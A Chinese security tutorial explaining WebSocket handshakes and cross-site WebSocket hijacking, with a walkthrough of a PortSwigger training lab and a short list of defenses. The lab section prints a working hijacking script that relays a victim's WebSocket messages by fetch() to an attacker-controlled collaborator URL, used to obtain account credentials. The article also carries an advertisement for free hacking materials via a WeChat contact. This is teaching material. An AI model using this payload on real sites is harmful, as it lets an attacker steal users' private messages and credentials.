声明：本文仅限于技术讨论与分享，严禁用于非法途径。若读者因此作出任何危害网络安全行为后果自负，与本号及原作者无关。

###  **WebSocket劫持漏洞导读**

#### WebSocket协议技术

WebSocket是HTML5推出的新协议，是基于TCP的应用层通信协议，它与http协议内容本身没有关系。WebSocket 也类似于 TCP
一样进行握手连接，跟 TCP 不同的是，WebSocket 是基于 HTTP 协议进行的握手，它在客户端和服务器之间提供了一个基于单 TCP
连接的高效全双工通信信道

websocket是持久化的协议，而http是非持久的

当通信协议从 http://或 https://切换到 ws://或 wss://后，表示应用已经切换到了WebSocket协议通信状态

WebSocket连接的建立需要经过连接请求、握手、连接建立三个步骤，如下图

![1.jpg](https://image.3001.net/images/20220715/1657878204_62d136bc59dc3e9a2cf31.jpg!small)

#### 建立WebSocket连接

WebSocket连接通常是使用客户端JavaScript创建的

 **var** ws = **new** WebSocket("wss://normal-website.com/chat");  
//该`wss`协议建立在一个加密的TLS连接的WebSocket，而`ws`协议使用未加密的连接。

为了建立连接，浏览器和服务器通过HTTP执行WebSocket握手。浏览器发出WebSocket握手请求，如下所示：

> `GET /chat HTTP/1.1  
> Host: normal-website.com  
> Sec-WebSocket-Version: 13  
> Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==  
> Connection: keep-alive, Upgrade  
> Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2  
> Upgrade: websocket`

如果服务器接受连接，则它将返回WebSocket握手响应，如下所示：

> `HTTP/1.1 101 Switching Protocols  
> Connection: Upgrade  
> Upgrade: websocket  
> Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=`

此时，网络连接保持打开状态，并且可以用于向任一方向发送WebSocket消息。

请求和响应中 的Connection和Upgrade标头表示这是WebSocket握手

#### WebSocket安全漏洞

原则上，由于WebSocket涉及多个层面，任何与WebSocket有关的web安全漏洞都有可能出现

• 传输到服务器的用户的输入以不安全方式处理，出现SQL注入或XML外部实体注入等

• 通过WebSockets达到的某些盲洞(blind vulnerabilities)可能仅可使用带外(OAST)技术才能检测到

• 如果攻击者控制的数据通过WebSockets传输到其他应用程序用户，则可能导致XSS或其他客户端漏洞

![1.png](https://image.3001.net/images/20220715/1657878205_62d136bd521a96de8553a.png!small)

本文主要讲探讨的是 **跨站WebSocket劫持漏洞-CSWSH**

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

###  **跨站WebSocket劫持漏洞**

#### 什么是跨站WebSocket劫持漏洞

Websocket带来的安全特性在一定程度上缓解了一些特性的攻击，但在日渐发展的攻击方式下，其相关漏洞也不断曝光，其中最常见的漏洞是CSWSH(Cross-Site WebSocket Hijacking)跨站WebSocket劫持漏洞

我们可以看见WebSocket的链接过程与http是极其相似的，WebSocket协议在握手阶段是基于HTTP的。它在握手期间是没有规定服务器如何验证客户端的身份，因此，服务器需要采用http客户端认证机制来辨明身份，如常见的cookie、http头基本认证等。这就导致了容易被攻击者利用恶意网页伪装用户的身份，与服务器建立WebSocket连接

CSWSH与跨站请求伪造CSRF的漏洞原理极其类似

![2.jpg](https://image.3001.net/images/20220715/1657878206_62d136be34f65f2541d41.jpg!small)

相较于CSRF漏洞只能发送伪造请求，跨站WebSocket劫持漏洞却可以建立了一个完整的读/写双向通道，且不受同源策略的限制，这在很大意义上都造成了更大的危害和可操作性

#### 跨站WebSocket劫持漏洞可能带来的影响

• 执行伪造成用户的未授权操作

与常规CSRF类似，攻击者可以伪造成用户利用生成的WebSocket通道以执行一些敏感操作

• 检索用户可访问的敏感数据

与常规CSRF不同的时，CSWSH是建立一个可双向交互的通道，当客户端向用户发送敏感数据时，攻击者可以将其拦截并记录得到敏感信息

#### 跨站WebSocket劫持漏洞靶场演示

##### 靶机环境

• 靶场

借助于burpsuite练兵场

[Lab: Cross-site WebSocket hijacking | Web Security Academy
(portswigger.net)](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

• 浏览器环境

edge浏览器

##### 靶场解析

• 点击启动靶场

![2.png](https://image.3001.net/images/20220715/1657878207_62d136bf0cda0a4ff1bd2.png!small)

• 观察发现存在实时聊天界面，观察发现没有CSRF的令牌

• 将代码复制到body

> ` **< script>**  
>  **var** ws = **new** WebSocket('wss://your-websocket-url');  
> ws.onopen = **function** () {  
> ws.send("READY");  
> };  
> ws.onmessage = **function** (event) {  
> fetch('[https://your-collaborator-url](https://your-collaborator-url/)',
> {method: 'POST', mode: 'no-cors', body: event.data});  
> };  
>  **< /script>**`

• wss://your-websocket-url替换成目前url

• [https://your-collaborator-url](https://your-collaborator-url/)替换成Burp
Collaborator Client或自己搭建的Burp Collaborator 服务器

• 可以点击view exploit测试，也可以直接发给攻击方

![3.png](https://image.3001.net/images/20220715/1657878207_62d136bfe9de75aac1d67.png!small)

• 然后在Burp Collaborator Client多poll几下

• 翻看一下得到账号密码

![4.png](https://image.3001.net/images/20220715/1657878209_62d136c125e299aeb9c0e.png!small)

然后我选择再用dnslog验证一遍

![5.png](https://image.3001.net/images/20220715/1657878210_62d136c264f2d2adf94d5.png!small)

![6.png](https://image.3001.net/images/20220715/1657878211_62d136c3567a482ddd95e.png!small)

确实可以带出数据，执行敏感操作

###  **如何防范跨站WebSocket劫持漏洞**

• 校验Origin头

• 双向将WebSocket传输数据视为不可信

• 对WebSocket握手信息进行加密保护

• 硬编码WebSockets终结点的URL

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

